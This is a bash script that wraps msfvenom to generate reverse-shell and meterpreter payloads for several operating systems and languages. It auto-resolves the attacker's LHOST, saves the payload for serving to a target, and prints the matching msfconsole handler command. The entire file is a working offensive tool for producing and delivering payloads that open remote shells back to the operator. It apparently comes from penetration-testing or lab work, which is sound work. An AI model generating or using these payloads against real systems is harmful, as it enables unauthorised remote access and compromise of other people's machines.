#!/usr/bin/env bash
#
# payload-gen.sh
#
# msfvenom wrapper. Pick OS/arch/format and shell type, auto-fill LHOST from an
# interface, and drop the payload into a directory (by default the same place
# serve.sh hands files out of). Prints the matching msfconsole handler.
#
# Usage:
#   ./payload-gen.sh --os linux   --arch x64 --format elf -i tun0 -p 4444
#   ./payload-gen.sh --os windows --arch x64 --format exe -i tun0 -p 443 --type meterpreter
#   ./payload-gen.sh --os windows --format exe -i 10.10.14.5 -p 4444 --out ./www
#   ./payload-gen.sh --os linux --format elf -i tun0 -p 4444 --dry-run
#
# OS: linux, windows, mac, php, python   Type: shell (default), meterpreter
#
set -uo pipefail

OS=""
ARCH="x64"
FORMAT=""
TYPE="shell"
LHOST=""
LPORT=""
OUT="./privesc-tools"
DRY_RUN=0

die()  { echo "ERROR: $*" >&2; exit 1; }
have() { command -v "$1" >/dev/null 2>&1; }

usage() {
  grep '^#' "$0" | sed 's/^# \{0,1\}//' | sed '/^!/d'
  exit "${1:-0}"
}

resolve_lhost() {
  local v="$1"
  if [ -d "/sys/class/net/$v" ]; then
    ip -4 -o addr show "$v" 2>/dev/null | awk '{print $4}' | cut -d/ -f1 | head -n1
  else
    echo "$v"
  fi
}

run() {
  if [ "$DRY_RUN" -eq 1 ]; then echo "   [dry-run] $*"; return 0; fi
  "$@"
}

# --- parse args -----------------------------------------------------------
while [ $# -gt 0 ]; do
  case "$1" in
    -h|--help)    usage 0 ;;
    --os)         shift; [ $# -gt 0 ] || die "--os needs a value"; OS="$1" ;;
    --os=*)       OS="${1#*=}" ;;
    --arch)       shift; ARCH="$1" ;;
    --arch=*)     ARCH="${1#*=}" ;;
    --format|-f)  shift; FORMAT="$1" ;;
    --format=*)   FORMAT="${1#*=}" ;;
    --type)       shift; TYPE="$1" ;;
    --type=*)     TYPE="${1#*=}" ;;
    -i|--lhost)   shift; LHOST="$1" ;;
    -p|--lport)   shift; LPORT="$1" ;;
    --out|-o)     shift; OUT="$1" ;;
    --out=*)      OUT="${1#*=}" ;;
    --dry-run|-n) DRY_RUN=1 ;;
    *)            die "Unknown option: $1 (try --help)" ;;
  esac
  shift
done
[ -n "$OS" ]     || { echo "No --os given." >&2; usage 2; }
[ -n "$FORMAT" ] || { echo "No --format given." >&2; usage 2; }
[ -n "$LHOST" ]  || { echo "No LHOST (-i) given." >&2; usage 2; }
[ -n "$LPORT" ]  || { echo "No LPORT (-p) given." >&2; usage 2; }

LHOST_R=$(resolve_lhost "$LHOST")
[ -n "$LHOST_R" ] || die "Could not resolve an IPv4 for '$LHOST'."

# --- map to a msfvenom payload string -------------------------------------
stage="reverse_tcp"
case "$OS" in
  linux)   base="linux/${ARCH}/${TYPE}/${stage}";   [ "$TYPE" = shell ] && base="linux/${ARCH}/shell_${stage}" ;;
  windows) base="windows/${ARCH}/${TYPE}/${stage}"; [ "$TYPE" = shell ] && base="windows/${ARCH}/shell_${stage}" ;;
  mac)     base="osx/${ARCH}/shell_${stage}" ;;
  php)     base="php/${TYPE}/${stage}";             [ "$TYPE" = shell ] && base="php/reverse_php" ;;
  python)  base="python/${TYPE}/${stage}";          [ "$TYPE" = shell ] && base="python/shell_${stage}" ;;
  *)       die "Unknown --os '$OS' (linux|windows|mac|php|python)." ;;
esac

ext="$FORMAT"
fname="rev_${OS}_${LPORT}.${ext}"
dest="${OUT%/}/$fname"

echo ">> Payload : $base"
echo ">> LHOST   : $LHOST_R  ($( [ "$LHOST_R" != "$LHOST" ] && echo "from $LHOST" || echo "literal" ))"
echo ">> LPORT   : $LPORT   Format: $FORMAT   Out: $dest"
echo

have msfvenom || { [ "$DRY_RUN" -eq 1 ] || die "msfvenom not found (metasploit-framework)."; }
run mkdir -p "$OUT"
run msfvenom -p "$base" LHOST="$LHOST_R" LPORT="$LPORT" -f "$FORMAT" -o "$dest"

# --- print the matching handler -------------------------------------------
cat <<EOF

>> Start the matching handler:
   msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $base; set LHOST $LHOST_R; set LPORT $LPORT; run"

>> Or serve it to the target:
   ./serve.sh --dir "$OUT" --lhost $LHOST_R
EOF
